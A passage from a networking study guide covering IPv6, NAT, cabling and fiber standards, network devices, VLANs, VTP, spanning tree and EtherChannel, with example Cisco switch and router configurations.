- **ISATAP:** Intra-Site Automatic Tunnel Addressing Protocol
- **Teredo:** UDP tunnel through NAT

**Translation:**
- **NAT64:** Translates IPv6 to IPv4 and vice versa
- **DNS64:** Synthesizes AAAA records from A records

### IPv6 vs IPv4 Comparison

| Feature | IPv4 | IPv6 |
|---------|------|------|
| Address size | 32 bits | 128 bits |
| Address notation | Dotted decimal | Hex colon |
| Address space | ~4.3 billion | ~340 undecillion |
| Broadcast | Yes | No (uses multicast) |
| ARP | Yes | No (NDP instead) |
| DHCP | Optional | Optional (SLAAC available) |
| NAT required | Usually | No (enough addresses) |
| Header size | Variable (20-60 bytes) | Fixed 40 bytes |
| Fragmentation | Router + host | Host only |
| IPsec | Optional | Mandatory (supported) |
| Checksum | In header | Not in header (handled by L4) |
| Flow label | No | Yes |
| Auto-configuration | APIPA only | SLAAC |

### IPv6 Header Format (Fixed 40 bytes)

```
| Version(4) | Traffic Class(8) | Flow Label(20) |
|      Payload Length(16)       | Next Header(8) | Hop Limit(8) |
|                Source Address (128 bits)                       |
|             Destination Address (128 bits)                     |
```

- **Version:** 6
- **Traffic Class:** DSCP + ECN (QoS)
- **Flow Label:** Identifies flows for QoS
- **Payload Length:** Size of data after header
- **Next Header:** Protocol of next header (6=TCP, 17=UDP, 58=ICMPv6, 43=Routing, 44=Fragment)
- **Hop Limit:** Like TTL — decremented per hop

---

## 2.9 NAT (Network Address Translation)

NAT translates private IP addresses to public IP addresses, allowing multiple devices to share one public IP.

### NAT Types

**Static NAT (one-to-one):**
- Maps one private IP to one public IP permanently
- Used for servers that need consistent public address
- Not address-conserving

**Dynamic NAT (pool-based):**
- Maps private IPs to a pool of public IPs
- Mapping is temporary and dynamic
- Still one-to-one at any given time

**PAT (Port Address Translation) / NAT Overload:**
- Maps many private IPs to one public IP using different port numbers
- Most common form (used in homes and enterprises)
- Also called "NAT overload" in Cisco terminology
- Uses source port numbers to track sessions

```
Inside host: 192.168.1.10:51234 → Internet: 203.0.113.1:51234
Inside host: 192.168.1.20:51234 → Internet: 203.0.113.1:51235
(same src port, different translation)
```

### NAT Terminology (Cisco)

- **Inside local:** Private IP of inside host (192.168.1.10)
- **Inside global:** Public IP representing inside host (203.0.113.1:51234)
- **Outside local:** IP of external host as seen from inside (usually same as outside global)
- **Outside global:** Actual public IP of external host (8.8.8.8)

### NAT64

Used for IPv6-only clients to reach IPv4 servers:
- Well-known NAT64 prefix: `64:ff9b::/96`
- IPv4 address appended to prefix: `64:ff9b::8.8.8.8` = `64:ff9b::0808:0808`

---

## 2.10 IP Address Planning Best Practices

**Hierarchical addressing:**
- Assign contiguous address blocks to regions/sites
- Enables route summarization
- Example: 10.1.0.0/16 for Site A, 10.2.0.0/16 for Site B

**Route summarization:**
- Combine multiple specific routes into one summary route
- Reduces routing table size and update traffic
- Example: 192.168.0.0/24, 192.168.1.0/24, 192.168.2.0/24, 192.168.3.0/24 → summarized as 192.168.0.0/22

**Finding the summary address:**
1. Write all networks in binary
2. Find the common bits from the left
3. The summary prefix length = number of common bits
```
192.168.0.0 = 11000000.10101000.00000000.00000000
192.168.1.0 = 11000000.10101000.00000001.00000000
192.168.2.0 = 11000000.10101000.00000010.00000000
192.168.3.0 = 11000000.10101000.00000011.00000000
Common bits: 22 → Summary: 192.168.0.0/22
```

---
# SECTION 3: Network Hardware, Cabling, and Physical Infrastructure

---

## 3.1 Network Interface Cards (NICs)

A **NIC (Network Interface Card)** is the hardware that connects a device to a network. It operates at both Layer 1 (physical signaling) and Layer 2 (MAC addressing).

**NIC functions:**
- Converts parallel data from the computer bus to serial data for the network
- Generates and detects electrical/optical/radio signals
- Provides a unique MAC address (burned into firmware)
- Handles framing, error detection (FCS)
- Manages access to the shared medium (CSMA/CD or CSMA/CA)

**NIC types:**
- **Copper (RJ-45):** 10/100/1000 BASE-T, 10GBASE-T
- **Fiber (SFP/SFP+/QSFP):** SFP = 1 Gbps, SFP+ = 10 Gbps, QSFP = 40/100 Gbps
- **Wireless (Wi-Fi):** 802.11a/b/g/n/ac/ax
- **PCIe NIC:** Add-in card for desktop/server
- **USB NIC:** Portable, plug-and-play

**Auto-negotiation:** NICs and switches automatically agree on speed (10/100/1000) and duplex (half/full) — IEEE 802.3u.

**Duplex mismatch:** One side set to full-duplex, other to half-duplex — causes collisions and poor performance.

---

## 3.2 Ethernet Cabling Standards (Copper)

### Cable Categories

| Category | Max Speed | Max Bandwidth | Max Length | Notes |
|----------|-----------|--------------|-----------|-------|
| Cat3 | 10 Mbps | 16 MHz | 100m | Legacy voice/data |
| Cat5 | 100 Mbps | 100 MHz | 100m | FastEthernet |
| Cat5e | 1 Gbps | 100 MHz | 100m | Most widely deployed |
| Cat6 | 1 Gbps (10G up to 55m) | 250 MHz | 100m | Better noise rejection |
| Cat6a | 10 Gbps | 500 MHz | 100m | Augmented, thicker |
| Cat7 | 10 Gbps | 600 MHz | 100m | Shielded, GG45 connector |
| Cat7a | 40 Gbps (short) | 1000 MHz | 100m | Future-proof |
| Cat8 | 25/40 Gbps | 2000 MHz | 30m | Datacenter only |

### Cable Construction

**UTP (Unshielded Twisted Pair):**
- Most common type for LAN
- 4 pairs of twisted copper wires
- Twisting reduces **electromagnetic interference (EMI)** and **crosstalk**
- No shielding — susceptible to external interference

**STP (Shielded Twisted Pair):**
- Has overall foil/braid shield around pairs
- Better EMI protection, used in industrial environments
- Requires grounding; more expensive to install

**ScTP / F/UTP / S/FTP:** Various shielding configurations
- **F/UTP:** Foil overall, unshielded pairs
- **S/UTP:** Braid overall, unshielded pairs
- **S/FTP:** Braid overall + foil per pair (best protection)

### Wiring Standards (T568A and T568B)

Both ends must use the **same standard** for straight-through cables.

**T568B (most common in US):**
```
Pin 1: Orange-White
Pin 2: Orange
Pin 3: Green-White
Pin 4: Blue
Pin 5: Blue-White
Pin 6: Green
Pin 7: Brown-White
Pin 8: Brown
```

**T568A:**
```
Pin 1: Green-White
Pin 2: Green
Pin 3: Orange-White
Pin 4: Blue
Pin 5: Blue-White
Pin 6: Orange
Pin 7: Brown-White
Pin 8: Brown
```

**Ethernet pin usage:**
- Pins 1,2: Transmit (TX)
- Pins 3,6: Receive (RX)
- Pins 4,5,7,8: Unused (10/100) or used (Gigabit uses all 4 pairs)

### Cable Types

**Straight-through:** Both ends same standard (T568A-T568A or T568B-T568B)
- Use between **different** device types: PC ↔ Switch, Router ↔ Switch

**Crossover:** One end T568A, other end T568B (crosses TX and RX)
- Use between **same** device types: Switch ↔ Switch, PC ↔ PC, Router ↔ Router
- **Modern switches have Auto-MDIX** — auto-detect and adjust, making cable type irrelevant

**Rollover (Console cable):** Pin 1↔8, 2↔7, 3↔6, 4↔5 — complete reversal
- Used for Cisco console port access (RJ-45 to DB9 or USB)
- Also called "Yost cable"

### RJ-45 Connector
- 8-position 8-contact (8P8C) modular connector
- Used for all copper Ethernet
- **Crimping:** Attaching connector to cable with a crimping tool
- **Punch-down:** Connecting wire to patch panel/keystone jack (110 block)

---

## 3.3 Fiber Optic Cabling

Fiber uses **light pulses** instead of electrical signals. Immune to EMI, supports longer distances and higher speeds.

### Fiber Types

**Multimode Fiber (MMF):**
- Larger core (50 or 62.5 micron)
- Multiple light paths (modes) travel simultaneously
- Shorter distances (up to ~2km) due to modal dispersion
- Less expensive, uses LED light source
- Orange jacket (OM1/OM2), Aqua (OM3/OM4), Lime green (OM5)
- Standards: OM1, OM2, OM3, OM4, OM5

**Single-mode Fiber (SMF):**
- Very small core (8–9 micron)
- Single light path — no modal dispersion
- Much longer distances (up to 100+ km)
- Uses laser light source
- More expensive
- Yellow jacket (OS1, OS2)
- Standards: OS1 (tight buffer, indoor), OS2 (loose tube, outdoor)

### Multimode Fiber Standards

| Standard | Core | Bandwidth | 10G Distance | 40/100G |
|---------|------|-----------|-------------|---------|
| OM1 | 62.5µm | 200 MHz·km | 33m | — |
| OM2 | 50µm | 500 MHz·km | 82m | — |
| OM3 | 50µm | 2000 MHz·km | 300m | 100m |
| OM4 | 50µm | 4700 MHz·km | 550m | 150m |
| OM5 | 50µm | 28000 MHz·km | 550m | 440m (SWDM) |

### Fiber Connectors

| Connector | Type | Notes |
|-----------|------|-------|
| **SC** | Snap/click | Square, common in datacenters |
| **LC** | Lucent/Little | Half-size SC; most common in modern deployments |
| **ST** | Bayonet twist | Round, older |
| **FC** | Screw-on | Very stable; telecom/test equipment |
| **MTP/MPO** | Multi-fiber push-on | 12 or 24 fibers; used in 40G/100G |
| **MTRJ** | Duplex small form | Both fibers in one connector |

**Polishing types:**
- **PC (Physical Contact):** Flat polish; basic return loss
- **UPC (Ultra Physical Contact):** Domed polish; better return loss
- **APC (Angled Physical Contact):** 8° angle; best return loss; green color

**Fiber issues:**
- **Attenuation:** Signal loss with distance (dB/km)
- **Modal dispersion:** Different modes arrive at different times (MMF only)
- **Chromatic dispersion:** Different wavelengths travel at different speeds
- **Connector dirt:** #1 cause of fiber problems — clean with fiber cleaning tool
- **Bend radius:** Too tight a bend → signal loss (macrobending)
- **Microbending:** Tiny bends from installation stress

### Fiber Wavelengths

- Multimode: 850nm (short wavelength), 1300nm
- Single-mode: 1310nm, 1550nm

**WDM (Wavelength Division Multiplexing):**
- Carry multiple wavelengths (colors) on one fiber
- **CWDM:** Coarse WDM — up to 18 channels, wider spacing
- **DWDM:** Dense WDM — up to 80+ channels, narrow spacing; used in long-haul

---

## 3.4 SFP and Transceiver Modules

**SFP (Small Form-factor Pluggable):** Hot-swappable module providing fiber or copper interface
- SFP: 1 Gbps
- SFP+ (enhanced): 10 Gbps
- SFP28: 25 Gbps
- QSFP: 40 Gbps (4×10 Gbps)
- QSFP+: 40 Gbps
- QSFP28: 100 Gbps
- OSFP/QSFP-DD: 400 Gbps

**Common SFP types:**
- **SX:** Short wavelength multimode (850nm)
- **LX:** Long wavelength single-mode (1310nm)
- **ZX:** Extended range single-mode (1550nm)
- **BiDi:** Bidirectional — TX and RX on same fiber (different wavelengths)
- **DAC (Direct Attach Copper):** Short copper cable with SFP on each end (datacenter)
- **AOC (Active Optical Cable):** Like DAC but fiber (longer reach)

---

## 3.5 Coaxial Cable

**Coax construction:** Center conductor → insulator → braided shield → outer jacket

**Types:**
- **RG-6:** Cable TV, satellite, DOCSIS (cable internet)
- **RG-59:** Older CCTV, short runs
- **RG-8/RG-11:** Thick Ethernet (10Base5), legacy

**Connectors:**
- **F-connector:** Cable TV and satellite (screw-on)
- **BNC:** Legacy 10Base2, CCTV (bayonet)
- **N-type:** Outdoor, RF equipment

---

## 3.6 Network Devices — Deep Dive

### Hub (Layer 1)
- **Repeats** electrical signals to all ports
- Creates one **collision domain** (all ports share bandwidth)
- Creates one **broadcast domain**
- Half-duplex operation only
- No intelligence — no MAC table
- Obsolete — replaced by switches
- **Passive hub:** Just splits/repeats signal
- **Active hub:** Regenerates signal (repeater)

### Switch (Layer 2)
- Makes forwarding decisions based on **MAC addresses**
- Each port = separate **collision domain**
- All ports share same **broadcast domain** (unless VLANs)
- **Full-duplex** operation on each port
- Builds and maintains a **MAC address table (CAM table)**

**Switch MAC address table operations:**

| Process | Trigger | Action |
|---------|---------|--------|
| **Learning** | Frame received | Record source MAC + port in table |
| **Forwarding** | Known unicast destination | Forward only to correct port |
| **Filtering** | Source = destination port | Don't forward |
| **Flooding** | Unknown unicast, multicast, broadcast | Forward to all ports except source |
| **Aging** | Timer expires (default 300s) | Remove stale MAC entries |

**Switch forwarding methods:**
- **Store-and-forward:** Receive entire frame, check FCS, then forward. Detects errors. Higher latency.
- **Cut-through:** Forward after reading destination MAC. Lower latency. No error checking.
  - **Fast-forward:** Forward immediately after dest MAC
  - **Fragment-free:** Forward after 64 bytes (avoids runts)

**Port speeds and auto-negotiation:**
- 10/100/1000 Mbps auto-negotiation (IEEE 802.3u)
- If one side forces speed/duplex, other auto-negotiates → duplex mismatch risk

**PoE (Power over Ethernet):**
- Delivers electrical power over Ethernet cable
- **802.3af (PoE):** 15.4W per port
- **802.3at (PoE+):** 30W per port
- **802.3bt (PoE++):** 60W (Type 3) or 100W (Type 4) per port
- Used by: IP phones, wireless APs, IP cameras, IoT devices

**Managed vs Unmanaged switches:**
- **Unmanaged:** Plug-and-play, no configuration, simple networks
- **Managed:** Full control — VLANs, STP, port security, SNMP, QoS, port mirroring
- **Smart/Web-managed:** Limited management via web GUI (between managed and unmanaged)

### Router (Layer 3)
- Routes packets between **different networks** using IP addresses
- Each interface = separate **broadcast domain** and **collision domain**
- Maintains a **routing table** to determine best path
- Runs routing protocols (OSPF, EIGRP, BGP)
- Provides NAT, DHCP relay, ACLs, QoS

**Router interface types:**
- **LAN interfaces:** Ethernet (RJ-45 or SFP) — connects to internal networks
- **WAN interfaces:** Serial (T1/E1), DSL, cellular modem, fiber
- **Loopback interfaces:** Virtual, always up — used for management, BGP, OSPF

**Router decision process:**
1. Check if destination is directly connected
2. Check routing table for most specific match (longest prefix)
3. If no match, use default route (0.0.0.0/0)
4. If no default, drop and send ICMP unreachable

### Layer 3 Switch (Multilayer Switch)
- Combines switching and routing in hardware
- Performs routing at wire-speed (faster than traditional routers)
- Uses ASICs (Application-Specific Integrated Circuits)
- Ideal for inter-VLAN routing within a campus
- Also called **MLS (Multilayer Switch)**

### Firewall
- Controls traffic based on configured rules
- Can operate at multiple OSI layers

**Types:**
- **Packet filter (stateless):** Rules based on IP/port/protocol only; no session tracking
- **Stateful firewall:** Tracks TCP/UDP connection state; allows return traffic automatically
- **Application-layer / proxy firewall:** Deep packet inspection; understands application protocols
- **NGFW (Next-Generation Firewall):** IPS, URL filtering, SSL inspection, application awareness, user-based policies
- **UTM (Unified Threat Management):** All-in-one appliance (firewall + IPS + AV + VPN + DLP)

**Firewall zones:**
- **Inside (trusted):** Internal LAN
- **Outside (untrusted):** Internet
- **DMZ:** Servers accessible from internet (web, email, DNS)

**Firewall rule processing:** Top-down, first match wins. Implicit deny at bottom.

### Access Point (AP)
- Provides wireless connectivity (Layer 2)
- Bridges wireless and wired networks
- **BSS (Basic Service Set):** Single AP + its clients; BSSID = AP's MAC
- **ESS (Extended Service Set):** Multiple APs, same SSID — seamless roaming
- **IBSS (Independent BSS / Ad-hoc):** No AP, peer-to-peer wireless
- **Mesh:** APs communicate wirelessly, one or more connect to wired network

**Wireless modes:**
- **Infrastructure mode:** Client connects to AP
- **Ad-hoc mode:** Client-to-client direct (no AP)
- **Monitor mode:** Passive capture of all frames (used by Wireshark, aircrack)

### Load Balancer
- Distributes traffic across multiple servers
- **Layer 4 LB:** Routes based on IP/TCP/UDP port
- **Layer 7 LB (Application Delivery Controller):** Routes based on HTTP headers, URL, cookies
- **Methods:** Round-robin, least connections, IP hash, weighted, random
- **Health checks:** Periodically test servers; remove failed servers
- **SSL offloading:** Handle SSL at load balancer, HTTP to servers
- **Session persistence (sticky sessions):** Route same client to same server

### IDS and IPS
- **IDS (Intrusion Detection System):** Monitors and **alerts** on suspicious activity
  - **Passive:** Out-of-band, receives copy of traffic (SPAN/mirror port or TAP)
  - No impact on traffic flow if device fails
- **IPS (Intrusion Prevention System):** Monitors and **blocks** suspicious activity
  - **Inline:** All traffic passes through
  - Can cause network outage if device fails (fail-open vs fail-closed)

**Detection methods:**
- **Signature-based:** Matches known attack signatures; fast, low false positives, misses zero-days
- **Anomaly-based:** Establishes baseline, alerts on deviations; catches unknowns, higher false positives
- **Policy-based:** Alerts on policy violations
- **Heuristic/behavioral:** Analyzes behavior patterns over time

### Proxy Server
- Acts as intermediary between clients and servers
- **Forward proxy:** Client sends requests to proxy, proxy forwards to internet
  - Web filtering, caching, anonymization
- **Reverse proxy:** Internet clients connect to proxy, which forwards to internal servers
  - Load balancing, SSL termination, caching, hide backend

### Content Delivery Network (CDN)
- Geographically distributed servers caching content close to users
- Reduces latency, origin server load, and bandwidth
- Examples: Cloudflare, Akamai, AWS CloudFront

### WLAN Controller (WLC)
- Centrally manages multiple access points
- **Lightweight APs (LAPs):** APs managed by controller (CAPWAP protocol)
- **CAPWAP (Control and Provisioning of Wireless Access Points):** UDP 5246 (control), 5247 (data)
- Handles roaming, RF management, firmware updates, security policies

### Network TAP (Test Access Point)
- Hardware device that copies all traffic for monitoring
- **Passive TAP:** No power needed, splits light/signal
- **Active TAP:** Powered, regenerates signal
- Unlike SPAN ports — doesn't use switch CPU, captures all traffic including errors

---

## 3.7 Cabling Infrastructure

### Structured Cabling Standards (TIA-568)
The TIA-568 standard defines commercial building cabling.

**Six subsystems:**
1. **Entrance facility:** Where service providers enter the building
2. **Equipment room (ER):** Central cabling hub, main servers
3. **Backbone cabling (vertical):** Between floors/equipment rooms; fiber
4. **Telecommunications room (TR):** Floor-level distribution; patch panels
5. **Horizontal cabling:** From TR to work area outlets; Cat5e/6/6a max 90m
6. **Work area:** From outlet to device; patch cord max 10m

**90-10 rule:** Horizontal cable max 90m + 10m for patch cords = 100m total

### Patch Panel
- Organized termination point for horizontal cabling
- Allows easy connection/reconnection with patch cords
- 110-block punchdown on back, RJ-45 on front
- Available in 24-port, 48-port configurations

### 66-block and 110-block
- **66-block:** Older telephone/voice wiring standard
- **110-block:** Newer, supports higher speeds; used in Cat5e+

### Cable Management
- **Cable tray:** Open tray for cable routing (above ceiling, under floor)
- **Conduit:** Protects cables; EMT (metal) or PVC (plastic)
- **Ladder rack:** Open design for heavy cable bundles
- **Cable ties / Velcro:** Bundle cables
- **Labeling:** Every cable, port, and device should be labeled

### Tools
- **Crimper:** Attaches RJ-45 connectors to cable
- **Punch-down tool:** Connects wire to patch panel/keystone jack
- **Cable stripper:** Removes cable jacket without damaging conductors
- **Tone generator + probe (Fox and Hound):** Trace cables through walls
- **Cable tester:** Verifies pin-out connectivity
- **Cable certifier (Fluke):** Certifies cable meets standard performance (bandwidth, attenuation)
- **OTDR (Optical Time-Domain Reflectometer):** Tests fiber — finds breaks, measures length
- **Light meter:** Tests fiber signal strength
- **Visual fault locator (VFL):** Red laser to locate fiber breaks
- **Multimeter:** Tests DC/AC voltage, continuity

### Cable Testing Terms
- **Attenuation:** Signal loss over distance (should be < maximum spec)
- **Near-end crosstalk (NEXT):** Signal bleed from transmitting pair to adjacent pair (near the source)
- **Far-end crosstalk (FEXT):** Crosstalk at the far end
- **Return loss:** Signal reflected back from connector/cable imperfections
- **Propagation delay:** Time for signal to traverse cable
- **Delay skew:** Difference in propagation delay between pairs (Gigabit requires pairs arrive within 50ns)

---

## 3.8 Data Center Infrastructure

### Rack Units (U)
- 1U = 1.75 inches
- Standard rack = 42U or 48U
- Equipment height measured in rack units: 1U switch, 2U server, 4U chassis

### Power
- **UPS (Uninterruptible Power Supply):** Battery backup; protects against outages
  - **Standby UPS:** Switches to battery on failure (brief transfer time)
  - **Line-interactive UPS:** Conditions power, faster battery switch
  - **Online/double-conversion UPS:** Always on battery, no transfer time
- **PDU (Power Distribution Unit):** Distributes power within rack
- **ATS (Automatic Transfer Switch):** Switches between power sources
- **Generator:** Long-term backup power

### Cooling
- **CRAC (Computer Room Air Conditioner):** Dedicated cooling unit
- **Hot aisle / cold aisle:** Alternating rack orientations direct airflow
  - Cold aisle: Front of racks face each other → cold air flows in
  - Hot aisle: Back of racks face each other → hot air exhausted
- **In-row cooling:** Cooling between rows of racks
- **Liquid cooling:** High-density compute

### Structured Cabling in Datacenter
- **MDA (Main Distribution Area):** Core switches
- **HDA (Horizontal Distribution Area):** Access switches
- **EDA (Equipment Distribution Area):** Servers

---
# SECTION 4: Switching — VLANs, STP, EtherChannel, and More

---

## 4.1 VLANs (Virtual Local Area Networks)

A **VLAN** is a logical grouping of devices into separate broadcast domains on one or more switches — regardless of physical location.

### Why Use VLANs?
- **Security:** Isolate sensitive data (HR, Finance) from general users
- **Performance:** Reduce broadcast domain size; limit broadcast storms
- **Flexibility:** Group users logically (by function, not location)
- **Simplify management:** Apply consistent policies per VLAN
- **Cost:** One switch can logically become many

### VLAN Membership
- **Port-based (static) VLANs:** Ports assigned manually to VLANs (most common)
- **Dynamic VLANs:** VMPS server assigns VLAN based on MAC address
- **Voice VLANs:** Special VLAN for IP phones (QoS, separate subnet)

### VLAN ID Ranges
- **1:** Default VLAN (all ports belong by default)
- **2–1001:** Normal range (configurable)
- **1002–1005:** Reserved for legacy (FDDI, Token Ring)
- **1006–4094:** Extended range (requires VTP transparent or off mode)

### Access Ports
- Belongs to **one VLAN** only
- Connects end devices (PCs, phones, printers)
- Sends and receives **untagged** frames
- When device sends frame → switch adds VLAN tag internally
- When switch sends to device → tag is removed

### Trunk Ports
- Carries **multiple VLANs** on one link
- Used between switches, between switch and router, between switch and server
- Frames are **tagged** with VLAN ID using **802.1Q**

### 802.1Q VLAN Tagging
IEEE standard that inserts a 4-byte tag into the Ethernet frame:

```
| Dest MAC | Src MAC | 802.1Q Tag | EtherType | Data | FCS |
                      |TPID|PCP|DEI|VID|
                      |0x8100| 3b| 1b|12b|
```
- **TPID:** 0x8100 — identifies this as 802.1Q tagged frame
- **PCP (Priority Code Point):** 3 bits — 802.1p QoS (0-7)
- **DEI (Drop Eligible Indicator):** 1 bit — congestion marking
- **VID (VLAN ID):** 12 bits — VLAN number (0–4095)

**Native VLAN:** One VLAN on each trunk that sends/receives **untagged** frames. Default = VLAN 1. Should be changed for security.

> ⚠️ **Security:** Native VLAN mismatch can lead to **VLAN hopping** attacks. Best practice: change native VLAN to unused VLAN.

### Cisco VLAN Configuration

```cisco
! Create VLANs
Switch# conf t
Switch(config)# vlan 10
Switch(config-vlan)# name Sales
Switch(config-vlan)# vlan 20
Switch(config-vlan)# name Engineering
Switch(config-vlan)# exit

! Configure access port
Switch(config)# interface fa0/1
Switch(config-if)# switchport mode access
Switch(config-if)# switchport access vlan 10

! Configure trunk port
Switch(config)# interface gi0/1
Switch(config-if)# switchport mode trunk
Switch(config-if)# switchport trunk encapsulation dot1q   ! Required on some switches
Switch(config-if)# switchport trunk native vlan 99        ! Change native VLAN
Switch(config-if)# switchport trunk allowed vlan 10,20,30 ! Restrict VLANs

! Verify
Switch# show vlan brief
Switch# show interfaces trunk
Switch# show interfaces fa0/1 switchport
```

### Inter-VLAN Routing

VLANs are separate networks — routing is needed for them to communicate.

**Method 1: Router-on-a-Stick**
- One physical router interface connected to a trunk port
- Subinterfaces created for each VLAN
```cisco
Router(config)# interface gi0/0
Router(config-if)# no shutdown
Router(config-if)# interface gi0/0.10
Router(config-subif)# encapsulation dot1Q 10
Router(config-subif)# ip address 192.168.10.1 255.255.255.0
Router(config-if)# interface gi0/0.20
Router(config-subif)# encapsulation dot1Q 20
Router(config-subif)# ip address 192.168.20.1 255.255.255.0
```

**Method 2: Layer 3 Switch (SVIs)**
- Most efficient — routing in hardware
- **SVI (Switched Virtual Interface):** Virtual Layer 3 interface for each VLAN
```cisco
Switch(config)# ip routing                              ! Enable routing
Switch(config)# interface vlan 10
Switch(config-if)# ip address 192.168.10.1 255.255.255.0
Switch(config-if)# no shutdown
Switch(config)# interface vlan 20
Switch(config-if)# ip address 192.168.20.1 255.255.255.0
Switch(config-if)# no shutdown
```

---

## 4.2 VTP (VLAN Trunking Protocol)

**VTP** (Cisco proprietary) propagates VLAN configuration automatically across all switches in a domain.

### VTP Modes

| Mode | Behavior |
|------|---------|
| **Server** | Create/modify/delete VLANs; advertise to others; default mode |
| **Client** | Cannot create/modify/delete; receive and forward VTP ads |
| **Transparent** | Ignores VTP ads; forward them; local VLANs only |
| **Off** (v3) | Does not participate; does not forward ads |

### VTP Process
- VTP messages sent every 5 minutes or on change
- **Domain name:** All switches must match
- **Configuration revision number:** Higher wins; new VLAN updates increment number
- **VTP password:** Optional authentication

> ⚠️ **VTP Risk:** Adding a switch with higher revision number can **wipe out VLAN database** of entire domain!

```cisco
Switch(config)# vtp mode server
Switch(config)# vtp domain CompanyXYZ
Switch(config)# vtp password Secr3t
Switch(config)# vtp version 2
Switch# show vtp status
```

**VTP Pruning:** Automatically removes unnecessary VLAN traffic from trunk links (reduces broadcast traffic).

---

## 4.3 Spanning Tree Protocol (STP)

**Problem:** Redundant physical links between switches create **Layer 2 loops**, causing:
- **Broadcast storms:** Broadcasts loop infinitely, consuming all bandwidth
- **MAC table instability:** Same MAC address seen on multiple ports
- **Multiple frame delivery:** Duplicate frames to destination

**STP (IEEE 802.1D)** prevents loops by **logically blocking** redundant links while keeping them available for failover.

### STP Election Process

**Step 1: Elect Root Bridge**
- All switches start claiming to be root
- Switch with **lowest Bridge ID (BID) wins**
- BID = Priority (2 bytes) + MAC address (6 bytes)
- Default priority = 32768 (can be changed in multiples of 4096)
- Lower priority = more likely to become root

**Step 2: Elect Root Ports**
- Every **non-root switch** selects one port closest to root
- **Lowest cost path** to root bridge wins
- Port costs by interface speed:

| Speed | STP Cost (Old) | STP Cost (New/IEEE) |
|-------|-----------|---------------|
| 10 Mbps | 100 | 2,000,000 |
| 100 Mbps | 19 | 200,000 |
| 1 Gbps | 4 | 20,000 |
| 10 Gbps | 2 | 2,000 |
| 100 Gbps | — | 200 |

**Tiebreakers for root port selection (in order):**
1. Lowest **root path cost**
2. Lowest **upstream BID**
3. Lowest **upstream port ID** (port priority + port number)

**Step 3: Elect Designated Ports**
- Each segment (link) must have one **designated port** — the one sending traffic toward leaves
- Root bridge: all ports = designated
- Other switches: Port with **lowest root path cost** = designated
- Remaining ports = **blocking**

### STP Port States (802.1D)

| State | Duration | Forwarding? | Learning MAC? | Description |
|-------|----------|-------------|---------------|-------------|
| **Blocking** | Up to 20s | No | No | Discards frames, listens for BPDUs |
| **Listening** | 15s (forward delay) | No | No | Not forwarding; building STP topology |
| **Learning** | 15s (forward delay) | No | Yes | Building MAC table |
| **Forwarding** | Ongoing | Yes | Yes | Normal operation |
| **Disabled** | — | No | No | Administratively shut down |

**Total time from blocking to forwarding (802.1D):** Up to **50 seconds**!
- Blocking: 20s (Max Age)
- Listening: 15s
- Learning: 15s

### BPDU (Bridge Protocol Data Unit)
- STP control messages exchanged between switches
- Sent every **2 seconds** (Hello interval)
- Contains: Root BID, Sender BID, Root path cost, Port ID, Timers

**STP timers (802.1D):**
- **Hello timer:** 2 seconds (BPDUs sent)
- **Forward Delay:** 15 seconds (listening and learning phases)
- **Max Age:** 20 seconds (BPDU timeout)

### Rapid STP (RSTP — 802.1w)

Addresses STP's slow convergence (~50 seconds → sub-second):
- **New port states:** Discarding, Learning, Forwarding (no Blocking/Listening)
- **New port roles:** Root, Designated, Alternate, Backup
- **Alternate port:** Pre-calculated backup for root port
- **Backup port:** Backup for designated port on shared media
- **Proposal/Agreement mechanism:** Handshake between switches for fast transition
- **Edge ports (PortFast):** Immediately go to forwarding — no negotiation

**RSTP port roles:**
- **Root port:** Best path to root bridge
- **Designated port:** Best port on each segment toward leaves
- **Alternate port:** Backup root port (blocks normally)
- **Backup port:** Backup designated port (blocks normally)

### Multiple STP Variants

| Protocol | Standard | Per-VLAN | Convergence |
|---------|----------|----------|-------------|
| STP | 802.1D | No (one instance) | ~50s |
| RSTP | 802.1w | No | Sub-second |
| PVST+ | Cisco | Yes | ~50s per VLAN |
| Rapid PVST+ | Cisco | Yes | Sub-second per VLAN |
| MSTP | 802.1s | Multiple VLANs per instance | Sub-second |

### Cisco STP Configuration

```cisco
! Set bridge priority (lower = more likely to be root)
Switch(config)# spanning-tree vlan 10 priority 4096
Switch(config)# spanning-tree vlan 10 root primary    ! Sets to 24576 or 4096 below current
Switch(config)# spanning-tree vlan 10 root secondary  ! Sets priority to 28672

! Change STP mode
Switch(config)# spanning-tree mode rapid-pvst
Switch(config)# spanning-tree mode pvst

! PortFast — access ports only (skip listening/learning)
Switch(config-if)# spanning-tree portfast
Switch(config)# spanning-tree portfast default  ! Enable on all access ports

! BPDU Guard — disable port if BPDU received (protects PortFast ports)
Switch(config-if)# spanning-tree bpduguard enable
Switch(config)# spanning-tree portfast bpduguard default

! BPDU Filter — don't send or receive BPDUs
Switch(config-if)# spanning-tree bpdufilter enable

! Root Guard — prevents port from becoming root port
Switch(config-if)# spanning-tree guard root

! Loop Guard — protects against unidirectional link failures
Switch(config-if)# spanning-tree guard loop

! Verify STP
Switch# show spanning-tree
Switch# show spanning-tree vlan 10
Switch# show spanning-tree vlan 10 detail
Switch# show spanning-tree interface gi0/1
```

---

## 4.4 EtherChannel / Link Aggregation

**EtherChannel (Cisco)** / **LAG (Link Aggregation Group)** bundles multiple physical links into one logical link:
- Increases bandwidth (up to 8 links × 10 Gbps = 80 Gbps)
- Provides redundancy (if one link fails, others continue)
- STP sees it as one logical link — no blocking!

### EtherChannel Protocols

**PAgP (Port Aggregation Protocol):** Cisco proprietary
- **Desirable:** Actively negotiates EtherChannel
- **Auto:** Passively waits; forms if other side is Desirable
- Desirable + Desirable = ✓ | Desirable + Auto = ✓ | Auto + Auto = ✗

**LACP (Link Aggregation Control Protocol):** IEEE 802.3ad standard (preferred)
- **Active:** Actively negotiates
- **Passive:** Waits; forms if other side is Active
- Active + Active = ✓ | Active + Passive = ✓ | Passive + Passive = ✗

**Static (mode ON):**
- No negotiation — just bundles links
- Both sides must be `on`
- No protocol overhead but no dynamic management

### EtherChannel Load Balancing
Traffic is distributed across member links based on a configurable hash:
- Source MAC, Destination MAC
- Source IP, Destination IP
- Source + Destination IP (XOR hash — best balance)
- Source TCP port, Destination TCP port

### EtherChannel Configuration (Cisco)

```cisco
! LACP EtherChannel
Switch(config)# interface range gi0/1 - 2
Switch(config-if-range)# channel-group 1 mode active
Switch(config-if-range)# exit

! Configure the Port-Channel interface
Switch(config)# interface port-channel 1
Switch(config-if)# switchport mode trunk
Switch(config-if)# switchport trunk allowed vlan 10,20

! PAgP EtherChannel
Switch(config)# interface range fa0/1 - 2
Switch(config-if-range)# channel-group 2 mode desirable

! Static EtherChannel
Switch(config)# interface range gi0/3 - 4
Switch(config-if-range)# channel-group 3 mode on
